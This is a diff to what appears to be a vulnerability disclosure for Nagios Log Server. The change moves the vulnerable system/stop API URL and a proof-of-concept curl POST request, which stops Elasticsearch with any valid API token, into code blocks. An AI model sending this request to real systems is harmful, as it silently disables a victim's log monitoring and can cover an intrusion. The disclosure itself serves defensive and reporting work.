@@ -25,12 +25,16 @@ Elasticsearch is a core dependency of Nagios Log Server. If it is stopped, logs 
 The API endpoint `system/stop` allows any user with API access to stop the Elasticsearch service, effectively disabling log monitoring.
 
 ## Vulnerable Endpoint:
-`http://<target-ip>/nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch&token=<valid_token>`
+```
+http://<target-ip>/nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch&token=<valid_token>`
+```
 
 ## Proof of Concept (PoC)
 **Step 1: Send API Request to Stop Elasticsearch Response (Incorrect Error Message)**
 
-`curl -X POST "http://<target-ip>/nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch&token=<valid_token>"`
+```bash
+curl -X POST "http://<target-ip>/nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch&token=<valid_token>"`
+```
 
 **Response (Incorrect Error Message)**
 
